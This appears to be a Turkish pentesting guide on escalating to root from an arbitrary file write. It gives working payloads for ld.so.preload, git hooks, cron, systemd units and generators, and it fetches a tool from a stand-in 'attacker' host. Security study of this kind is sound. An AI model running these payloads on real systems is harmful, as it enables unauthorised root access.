# Root Olarak Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`, dynamic linker'ın diğer shared object'lerden önce yüklediği shared object'lerin sistem genelindeki listesidir. Secure-execution mode, preloading için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir kütüphane yolu, tüm SUID binary'ler için geçerli bir teknik değildir.\
Bu dosyayı oluşturabilir veya değiştirebilirseniz, dosyayı yükleyen bir işlem listelenen kütüphaneyi diğer shared object'lerinden önce yükler ve böylece o işlemin bağlamında kod yürütülmesini sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR çıktısını kısıtlı bir dosya yazma işlemi olarak kullanma

Arayanın kaydedilen dosya adını seçmesine izin veren bir OCR hizmeti, tanınan görüntü metnini **kısıtlı bir dosya yazma** primitive’ine dönüştürebilir. Kaydedilen baytlar görüntü baytları değil, tanınan metindir; bu nedenle OCR çıktısında sözdizimi hataları olup olmadığını kontrol edin. İzin verilen hedef web üzerinden çalıştırılabiliyorsa ve `.php` dosya adına izin veriyorsa, bu metin istendiğinde çalıştırılabilir. MakeSense'te yerel olarak erişilebilen bir OCR uygulaması metni `/saved/` altına kaydediyordu; root olarak çalışan PHP sunucusu da kaydedilen dosyayı root olarak çalıştırıyordu. Yazma işlemi bu dizinle sınırlıydı; yol geçişi gösterilmedi.<sup>[[37]](#references)</sup>

Çalıştırma sonucunda kazanılan yetkiler, otomatik olarak OCR yazıcısının değil, **PHP sunucusu sürecinin** yetkileridir. Hedefin çalıştırma eşlemesini ve çalışma zamanı kimliğini doğrulayın; root yetkili bir OCR yazıcısı ile ayrıcalıksız bir web sunucusunun birlikte olması PHP'nin root olarak çalışacağı anlamına gelmez.<sup>[[37]](#references)</sup> Doğrudan [web kök dizinine yükleme modelini](../../pentesting-web/file-upload/) karşılaştırın.

### Git hooks

**Git hooks**, commit ve merge işlemleri dahil olmak üzere bir depodaki olaylarda çalıştırılan yürütülebilir betiklerdir. Bu işlemleri **ayrıcalıklı bir betik veya kullanıcı** gerçekleştiriyorsa ve saldırgan **`.git` klasörüne yazabiliyorsa**, hook **privilege escalation** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git deposundaki **`.git/hooks`** dizininde **bir betik oluşturmak** mümkündür:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Ayrıcalıklı Git tree export path traversal

Ayrıcalıklı bir senkronizör, checkout yapmaktan kaçınıp bunun yerine saldırganın etkileyebildiği bir depoyu `git ls-tree` ile listeleyebilir, her blob'u `git cat-file` ile okuyabilir, bildirilen dosya yolunu bir hazırlama dizinine ekleyebilir ve dosyayı kendisi yazabilir. `-c safe.directory=*` (Git'in farklı sahipli depolar için uyguladığı korumayı devre dışı bırakır) seçeneğini hedefin dizin içinde kalmasını denetleyen bir kontrol olmadan kullandığında, bu durum **senkronizörün ayrıcalıklarıyla keyfi dosya yazmaya** dönüşür. Mutlak bir tree girdisi adı, Python'daki `os.path.join(stage, name)` çağrısının `stage` değerini yok saymasına neden olur; `../` içeren göreli bir ad ise dosya sistemi yolu çözerken dizin dışına çıkar. Uygulama, Git'ten checkout yapmasını istemek yerine ham tree'yi diske yazdığı için checkout sırasında yapılan yol adı denetimi hedefi hiçbir zaman korumaz.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Root servislerinde, timer'larda, dağıtım ajanlarında, şablon içe aktarıcılarında ve yedekleme/geri yükleme işlerinde şu kod yapısını arayın:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Bir tree girdisi `<mode> SP <name> NUL <raw object ID>` biçiminde kodlanır. `git hash-object --literally` seçeneği, normal ayrıştırmanın veya `git fsck`'in reddedebileceği object verilerine bilinçli olarak izin verir; bu nedenle geçici bir clone, dosya adı mutlak bir hedef olan bir tree oluşturabilir. Bu örnek bir cron dosyası blob'u oluşturur, hazırlanmış tree'yi bir commit içine alır ve bir branch'i bu commit'e taşır; exploitation için yine de ayrıcalıklı işin kullandığı bir repository'yi güncelleme izni ve hatalı object'i kabul eden bir Git server gerekir.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening hem repository alımını hem de son dosya sistemi işlemini kapsamalıdır:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` yerine hizmetin güvenmesi gereken depoları tek tek belirtin ve mümkün olduğunda depo işlemlerini root olmayan yetkilerle yürütün.
- Dosyaları yerleştirmeden önce mutlak adları ve `.` ya da `..` bileşenlerini reddedin. Yolu birleştirdikten sonra kanonikleştirin ve hedefin amaçlanan kök dizinin altında kaldığını doğrulayın.
- Önce kontrol edip sonra açma işlemlerindeki symlink yarışlarından kaçının: güvenilir bir dizin tanıtıcısına göreli yollar kullanarak açın ve Linux'ta saldırganın denetimindeki yollar için `RESOLVE_BENEATH` ile `RESOLVE_NO_SYMLINKS` kullanan `openat2()` çağrısını tercih edin.
- Plumbing çıktısından checkout işlemini yeniden uygulamak yerine yalıtılmış bir dizinde normal checkout yapmayı tercih edin. Ham nesne alımı gerekiyorsa `receive.fsckObjects=true` gibi sunucu tarafı doğrulamayı etkinleştirin; hazırlanmış ağaçları reddetmek için gerekli yol adıyla ilgili `receive.fsck.*` bulgularını etkisizleştirmeyin.

### Ayrıcalıklı yapılandırma dağıtımı

Bazı yönetim hizmetleri, sistemin hedeflenen durumunu bir yapılandırma dosyasında saklar ve daha sonra bu dosyayı yükseltilmiş yetkilerle dağıtır. Örneğin, [openmediavault yapılandırmayı `/etc/openmediavault/config.xml` içinde saklar](https://docs.openmediavault.org/en/7.x/faq.html) ve [RPC arayüzü](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) hizmet değişikliklerini uygulayabilir. Daha düşük yetkili bir hesap bu dosyaya yazabiliyor veya dosyayı değiştirebiliyorsa, yetkilendirilmiş bir dağıtım talep edip edemediğini ve seçilen modülün değiştirilen alanı root olarak kullanıp kullanmadığını inceleyin. SSH hesap anahtarları, zamanlanmış komutlar ve paket kurulumu farklı önkoşullara sahiptir; dosyanın mevcut olması veya XML dosyasının yazılabilir olması bunlardan herhangi birini kanıtlamaz. Dosya ve üst dizin izinlerini, çağıranın gruplarını ve RPC yetkilendirmesini, kurulu sürümü ve gerçek tüketiciyi kontrol edin; envanter çıkarırken yapılandırmayı düzenlemeyin veya uygulama işlemi başlatmayın.

`/etc/fail2ban/action.d/` altındaki Fail2Ban action tanımları da ayrıcalıklı bir yapılandırma sınırıdır. Bu dizine yazabilen ve dizinde arama yapabilen bir kullanıcı, bir action tanımını değiştirebilir veya geçersiz kılma dosyası ekleyebilir; ancak yalnızca dizin izinleri kod yürütüldüğünü kanıtlamaz. Etkin bir jail'in etkilenen action'ı gerçekten seçtiğini, Fail2Ban hizmetinin action'ı daha yüksek yetkilerle yürüttüğünü ve yetkilendirilmiş bir yeniden yükleme/yeniden başlatma ile eşleşen bir ban olayının gerçekleşeceğini doğrulayın. Fail2Ban'i yeniden başlatmaya yönelik ilgisiz bir sudo izni, yalnızca tam olarak bu hizmet çağrısı için geçerliyse ve değiştirilen tanım yükleniyorsa önem taşır. [Fail2Ban'in action yapılandırma belgesi](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5), action dizini ile jail arasındaki ilişkiyi açıklar; [örnek action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf), `actionban` komutunun ban durumunda hizmet kullanıcısının yetkileriyle çalıştığını gösterir. Envanter çıkarırken action'ları değiştirmeden veya ban tetiklemeden izinleri ve etkin yapılandırmayı inceleyin.

Etkin bir Fail2Ban jail'i WHOIS ile zenginleştirilmiş bir mail action kullandığında ayrı bir sınır ortaya çıkar. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm), GNU mailutils `mail` komutuna pipe edilen güvenilmeyen WHOIS metniyle ilgiliydi; bu komutun escape işleme özelliği bir komut çalıştırabiliyordu. Daha düşük yetkili bir dosya yazarı, **seçili WHOIS istemcisinin** sunucu geçersiz kılma yapılandırmasını değiştirebiliyorsa yanıtı etkileyebilir; [Debian'ın `whois.conf(5)` belgesi](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) bu dosyalardan birini açıklar, ancak dosyanın konumu ve kullanımı kuruluma göre değişir. Etkin jail/action'ı, hizmet kimliğini, kullanılan WHOIS istemcisini ve yapılandırma yolunu, mail uygulamasını, yanıt üzerindeki denetimi ve kurulu tedarikçi düzeltmesini veya backport'u inceleyin. Yazılabilir bir WHOIS yapılandırma dosyası, Fail2Ban sürümü veya tek başına bir mail action bu zinciri kanıtlamaz; pasif envanter çıkarırken harici bir sunucuya sorgu göndermekten veya ban tetiklemekten kaçının.

### TFTP dosya oluşturma ve ayrıcalıklı paket kancaları

Erişilebilir bir TFTP hizmeti, etkin tftpd-hpa ayarları root olarak çalışıyorsa, dosya sisteminin kökünü `--secure` dizini olarak sunuyorsa ve `--create` seçeneğini etkinleştiriyorsa bir container veya yerel kullanıcı sınırını aşabilir. [tftpd-hpa kılavuzu](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html), dosya oluşturma ve kullanıcı seçeneklerini açıklar. Bu, `/etc/apt/apt.conf.d/` dahil olmak üzere ayrıcalıklı bir yapılandırma dizininde yeni bir dosya oluşturmak için kullanılabilir; mevcut bir dosyanın üzerine yazmak yine de mümkün olmayabilir. [APT yapılandırma kılavuzu](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html), `APT::Update::Pre-Invoke` komutlarını açıklar. Root olarak çalışan bir `apt update`, yalnızca yeni yapılandırma dosyasını okuyorsa daha yüksek yetkili tüketici olabilir. Çalışan daemon'un gerçek argümanlarını ve kimliğini, ağ erişimini ve filtrelemeyi, hedef dizinin oluşturma politikasını, APT'nin etkin yapılandırma kapsamını ve daha sonra gerçekleşecek ayrıcalıklı bir çağrıyı doğrulayın. Varsayılan bir dosya, yazılabilir bir hedef dizin veya zamanlanmış bir APT komutu tek başına tüm yolu kanıtlamaz. Pasif inceleme sırasında yalnızca yerel yapılandırmayı ve meta verileri sınırlı biçimde okuyun; dosya yüklemeyin veya APT çağırmayın.

### Cron ve zaman dosyaları

Root'un çalıştırdığı cron ile ilgili dosyalara **yazabiliyorsanız**, genellikle iş bir sonraki çalıştığında kod yürütme elde edebilirsiniz. İncelenebilecek hedefler:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` veya `/var/spool/cron/crontabs/` altındaki root'un kendi crontab dosyası
- `systemd` timer'ları ve tetikledikleri hizmetler

Hızlı kontroller:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipik kötüye kullanım yolları:

- **`/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya yeni bir root cron görevi ekleme**
- **`run-parts` tarafından zaten çalıştırılan bir script'i değiştirme**
- **Başlattığı script'i veya binary'yi değiştirerek mevcut bir timer hedefini backdoor'lama**

Minimal cron payload örneği:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Yalnızca `run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notlar:

- `run-parts` genellikle adında nokta bulunan dosyaları yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemlerde klasik cron yerine `systemd` timer'ları kullanılır, ancak kötüye kullanma fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirmek**.<sup>[[20]](#references)</sup>

### Servis ve Socket dosyaları

**`systemd` unit dosyalarına** veya bunların başvurduğu dosyalara yazabiliyorsanız unit'i yeniden yükleyip yeniden başlatarak ya da servis/socket etkinleştirme yolunun tetiklenmesini bekleyerek root olarak kod çalıştırabilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL'ler dâhil, sistem unit dizininin kendisinde yazma ve arama erişimi olup olmadığını da kontrol edin: dizini okuma/listeleme izni olmasa bile kullanıcı `/etc/systemd/system` içinde yeni bir unit oluşturabilir. Ancak tek başına bu yol hiçbir şeyi başlatmaz. Sistem yöneticisinin yeni unit'i yükleyeceğini, çağıranın ilgili ad için root yetkisi sağlayan etkili bir `systemctl start` veya `restart` iznine (ya da başka bir ayrıcalıklı etkinleştirme yoluna) sahip olduğunu ve servisin hedeflenen kimlikle çalıştığını doğrulayın. Diske kaydedilen mevcut ve yüklenmiş bir unit için `daemon-reload` gerekebilir; yeni adlandırılmış bir unit'in yüklenme davranışı farklıdır. Joker karakterli bir restart kuralının yeterli olduğunu varsaymadan önce sudo argümanlarını ve hariç tutulanları dikkatlice inceleyin. [systemd unit arama yoluna](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) ve [systemctl yükleme ve yeniden yükleme semantiğine](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) bakın.

İlginç hedefler şunlardır:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki Drop-in override'ları
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından başvurulan servis script'leri/binary'leri
- Bir root servisi tarafından yüklenen, yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Yaygın kötüye kullanım yolları:

- Değiştirebildiğiniz, root tarafından sahip olunan bir service unit içindeki **`ExecStart=`** değerini üzerine yazın
- Kötü amaçlı bir **`ExecStart=`** içeren bir **drop-in override** ekleyin ve önce eski değeri temizleyin
- Unit'in zaten başvurduğu script/binary dosyasına **backdoor** ekleyin
- Socket bağlantı aldığında başlayan ilgili `.service` dosyasını değiştirerek **socket-activated service**'i ele geçirin

Kötü amaçlı override örneği:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipik etkinleştirme akışı:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Kendiniz servisleri yeniden başlatamıyor ancak socket-activated bir unit'i düzenleyebiliyorsanız, backdoor eklenmiş servisin root olarak çalışmasını tetiklemek için yalnızca **bir istemci bağlantısını beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### systemd generator dizinleri

**System generator'ları**, hem boot sırasında hem de yapılandırma yeniden yüklemelerinde unit dosyalarını yüklemeden önce system manager tarafından başlatılan executable'lardır. Bu nedenle, bir system-generator dizinine (veya mevcut bir executable generator'a) yazma erişimi, denetim yalnızca `*.service` ve `*.timer` dosyalarını kontrol ettiğinde kolayca gözden kaçabilecek, doğrudan root olarak kod çalıştırma olanağı sağlar.<sup>[[35]](#references)[[36]](#references)</sup>

Yaygın arama sırası şöyledir: `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` ve `/usr/lib/systemd/system-generators/` (bazı dağıtımlarda `/lib/systemd/system-generators/`, `/usr` birleştirmesi üzerinden erişilebilir). Daha önceki bir dizindeki aynı ada sahip executable, sonraki dizindekini gölgeler. Bu **girdi executable dizinlerini**, generator'lar tarafından oluşturulan geçici unit çıktılarının bulunduğu `/run/systemd/generator`, `/run/systemd/generator.early` ve `/run/systemd/generator.late` dizinleriyle karıştırmayın.<sup>[[35]](#references)</sup>

Hızlı kontroller:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Yeni oluşturulan bir generator'ın executable biti ayarlanmış olmalıdır. Write primitive baytları kontrol ediyor ancak mode'u kontrol etmiyorsa, zaten executable olan bir generator'ı hedefleyin; dosyayı yerinde truncate etmek genellikle metadata'sını korur. Dizin yazılabilir durumdaysa yeni bir entry oluşturup executable olarak işaretleyin.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` komutunu **system** manager'a karşı çalıştırmak için uygun yetkilendirme gerekir; ancak bu komut tüm system generator'ları yeniden çalıştırır. Aksi takdirde ayrıcalıklı bir reload, paket işlemi veya reboot gerçekleşmesini bekleyin. `~/.config/systemd/user-generators/` gibi user-generator dizinleri user manager altında çalışır ve tek başlarına root yetkisi sağlamaz.<sup>[[35]](#references)</sup>

Hardening ve hunting için yalnızca son bileşenin mode bitlerini değil, her path bileşenini ve ACL'yi doğrulayın; generator'ların hash'lerini ve paket sahipliğini baseline olarak kaydedin ve tüm system-generator girdi dizinlerindeki oluşturma, yeniden adlandırma, içerik veya izin değişiklikleri için uyarı verin. Yazma işlemini izlemek önemlidir; çünkü one-shot generator çalıştıktan sonra kendini silebilir, `/run/systemd/generator*` altındaki oluşturulan unit ağacı ise bir sonraki reload sırasında yeniden oluşturulur.<sup>[[35]](#references)[[36]](#references)</sup>

### Ayrıcalıklı bir PHP sandbox tarafından kullanılan kısıtlayıcı `php.ini` dosyasının üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP kodunu **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki kod hâlâ **herhangi bir yazma primitive'ine** (ör. `file_put_contents`) sahipse ve daemon'un kullandığı **tam `php.ini` path'ine** erişebiliyorsanız, kısıtlamaları kaldırmak için bu config'in **üzerine yazabilir**, ardından yükseltilmiş privileges ile çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Tipik akış:

1. İlk payload sandbox config'inin üzerine yazar.
2. Tehlikeli functions yeniden etkinleştirildikten sonra ikinci payload kod çalıştırır.

Minimal örnek (daemon'un kullandığı path'i değiştirin):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Daemon root olarak çalışıyorsa (veya root sahipli yolları doğruluyorsa), ikinci çalıştırma root bağlamı sağlar. Bu, sandboxed runtime dosya yazabiliyorsa, esasen **config overwrite yoluyla privilege escalation** anlamına gelir.

### binfmt_misc

`binfmt_misc`, kayıtları `/proc/sys/fs/binfmt_misc` altında sunar; her kayıt bir dosya türü desenini bir interpreter ile eşleştirir. Yetki etkisi, kaydı kimin değiştirebildiğine ve eşleşen dosyayı daha sonra hangi sürecin çalıştırdığına bağlıdır; bu nedenle bunu bir privilege-escalation yolu olarak değerlendirmeden önce bu koşulları doğrulayın.<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE` yeteneğine sahip bir executable helper, çağıran doğrudan bu düğüme yazamasa bile, çağıranın denetimindeki verileri kabul edip `/proc/sys/fs/binfmt_misc/register` dosyasına yazıyorsa ayrı bir kayıt yolu oluşturabilir. İnceleme sırasında helper'ı çalıştırmadan girdisini ve yazma davranışını gözden geçirin. Kayıtlı bir kural `C` bayrağını kullanıyorsa interpreter, eşleşen binary'ye dayalı kimlik bilgilerini alır; bu nedenle root sahipli bir SUID eşleşmesi, çağıranın denetimindeki bir interpreter'ı root olarak çalıştırabilir. `binfmt_misc` bağlamasını ve kayıt politikasını, helper'ın etkin capability değerini, kuralı ve interpreter yolunu, çalıştırılabilir SUID hedefini ve `no_new_privs` ya da `nosuid` bağlamasının SUID geçişini engelleyip engellemediğini doğrulayın. Tek başına bir capability biti veya gömülü yol dizesi, yalnızca inceleme için bir ipucudur.<sup>[[21]](#references)</sup> SUID'nin bastırılma koşulları için [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) sayfasına bakın.

### Şema işleyicilerinin üzerine yazma (http: veya https: gibi)

Desktop ortamları, URI şemaları için bir uygulama seçmek amacıyla MIME ilişkilerini ve desktop entry'leri kullanır; ilgili kullanıcı başına yapılandırma ve desktop entry dizinlerine yazabilen bir saldırgan, bu şemaları denetimindeki bir launcher'a yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını değiştirerek HTTP ve HTTPS URL işleyicilerini kötü amaçlı bir dosyaya yönlendirmek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`), kullanıcının bir tıklamasının bu desktop entry'yi çalıştırmasına neden olabilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root'un kullanıcı tarafından yazılabilir script'leri/binary'leri çalıştırması

Ayrıcalıklı bir iş akışı `/bin/sh /home/username/.../script` (veya ayrıcalıksız bir kullanıcıya ait dizindeki herhangi bir binary) gibi bir komut çalıştırıyorsa, bunu ele geçirebilirsiniz:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit edin:** Root'un kullanıcı tarafından kontrol edilen yolları çağırdığını yakalamak için pspy ile süreçleri izleyin.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Yazılabilirliği doğrulayın:** hedef dosyanın ve dizininin kullanıcıya ait ve kullanıcı tarafından yazılabilir olduğundan emin olun.
- **Hedefi hijack edin:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan (veya root yetkisiyle başka bir işlem yapan) bir payload bırakın, ardından izinleri geri yükleyin:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Ayrıcalıklı eylemi tetikleyin** (ör. yardımcı programı başlatan bir UI düğmesine basarak). Root, ele geçirilmiş yolu yeniden çalıştırdığında `./rootshell -p` ile yükseltilmiş shell'i alın.

### Ayrıcalıklı binary'lerde yalnızca page cache üzerinde dosya değiştirme

Bazı kernel hataları dosyayı **diskte** değiştirmez. Bunun yerine, okunabilir bir dosyanın yalnızca **page cache kopyasını** değiştirmenize olanak tanır. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, diskteki dosya hash'i değişmediği hâlde bir sonraki çalıştırma bellekteki saldırgan denetimli byte'ları çalıştırabilir ve ayrıcalık yükseltebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu **yalnızca çalışma anında dosya yazma primitive'i** olarak düşünmek yararlıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve diskteki byte'lar değişmez
- **Bellek değişir**: önbelleğe alınmış sayfayı okuyan/çalıştıran süreçler, saldırgan tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik yeniden başlatma veya cache'in bellekten atılması sonrasında kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** hatalarının arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race'e dayanıyordu
- Dirty Pipe'ın yazma konumuyla ilgili kısıtları vardı
- Güvenlik açığı bulunan yol, file-backed sayfalara doğrudan yazmaya izin veriyorsa page-cache-only primitive daha güvenilir olabilir

#### Genel privesc akışı

1. **File-backed page cache sayfalarına** yazabilen bir kernel primitive'i elde edin
2. Bunu **okunabilir, ayrıcalıklı bir binary'ye** veya root tarafından çalıştırılan başka bir dosyaya uygulayın
3. Sayfa cache'den atılmadan önce çalıştırmayı tetikleyin
4. Diskteki dosya değiştirilmemiş gibi görünürken root olarak kod çalıştırın

Genellikle yüksek değerli hedefler:

- **setuid-root** binary'leri
- **Root servisleri** tarafından başlatılan yardımcı programlar
- **Host kernel/page cache'ini paylaşan container'lardan** sık çalıştırılan binary'ler

#### AF_ALG + `splice()` örnek yolu

Copy Fail (CVE-2026-31431), bu sınıfın iyi bir örneğidir. Güvenlik açığı bulunan yol, Linux crypto userspace API'sindeydi (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, page cache sayfalarına ait referansları okunabilir bir dosyadan crypto TX scatterlist'ine taşıyabilir
- `algif_aead`'in yerinde çalışan decrypt yolu kaynak ve hedef buffer'ları yeniden kullandı
- ardından `authencesn`, hedef tag bölgesine yazdı
- bu bölge hâlâ splice edilmiş, file-backed sayfalara referans veriyorsa yazma, **hedef dosyanın page cache'ine** yapıldı

Dolayısıyla ilginç olan tekniğin kendisi CVE değil, şu kalıptır:

- file-backed cache sayfalarını bir kernel subsystem'ine **beslemek**
- subsystem'in bu sayfaları yazılabilir çıktı olarak **ele almasını sağlamak**
- bellekte küçük ve denetimli bir üzerine yazma işlemi tetiklemek

Kamuya açık PoC, `/usr/bin/su` dosyasını bellekte yamalayıp ardından çalıştırmak için tekrarlanan **4-byte yazmalar** kullandı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone örnek yolu

DirtyClone (CVE-2026-43503), aynı **page-cache-only write-to-root** kalıbının başka bir varyantını gösterir; ancak bu kez yazma noktası `AF_ALG` yerine **IPsec ESP decrypt** işlemidir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Buradaki önemli teknik, **metadata-laundering adımıdır**:

- `splice()`, **salt okunur file-backed page-cache sayfasını** ESP-in-UDP paketine yerleştirir
- Orijinal DirtyFrag mitigasyonu, `esp_input()` işleminin decrypt öncesinde **kopyalama yapmasını** sağlamak için bu skb'yi `SKBFL_SHARED_FRAG` ile etiketledi
- netfilter `TEE`, paketi `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden çoğaltır
- clone, **aynı fiziksel page-cache referansını** korur ancak `SKBFL_SHARED_FRAG` bilgisini kaybeder
- ardından `esp_input()`, clone'u güvenli kabul eder ve file-backed sayfa üzerinde **yerinde `cbc(aes)` decrypt** çalıştırır

Dolayısıyla inceleme açısından çıkarılacak ders CVE'den daha kapsamlıdır: Bir mitigation, bir işlemin önce kopyalama yapıp yapmayacağına karar vermek için **skb/page metadata'sına** dayanıyorsa, backing page'i koruyup metadata'yı düşüren herhangi bir **clone/copy yolu**, yazma primitive'ini sessizce yeniden etkinleştirebilir.

Tipik exploitation akışı:

1. Özel bir network namespace içinde **`CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` kullanın
2. Loopback'i etkinleştirin ve `mangle/OUTPUT` içinde bir **netfilter `TEE` kuralı** yükleyin
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA'ları** yükleyin
4. Hedefteki her 4-byte word'ü SA'nın `seq_hi` alanında kodlayın (DirtyFrag'ın word-selection tekniği)
5. Splice edilmiş ESP-in-UDP paketini göndererek **TEE clone'unun** `esp_input()` işlemine ulaşmasını ve **yerinde decrypt** yapmasını sağlayın
6. `/usr/bin/su` dosyasının veya başka bir ayrıcalıklı çalıştırılabilir dosyanın page cache kopyası saldırgan denetimli kod içerene kadar tekrarlayın

Operasyonel açıdan etki, `AF_ALG` örneğindekiyle aynıdır: Diskteki dosya temiz kalır ancak `execve()`, **değiştirilmiş page cache byte'larını** kullanır ve root erişimi sağlar.<sup>[[8]](#references)[[9]](#references)</sup>

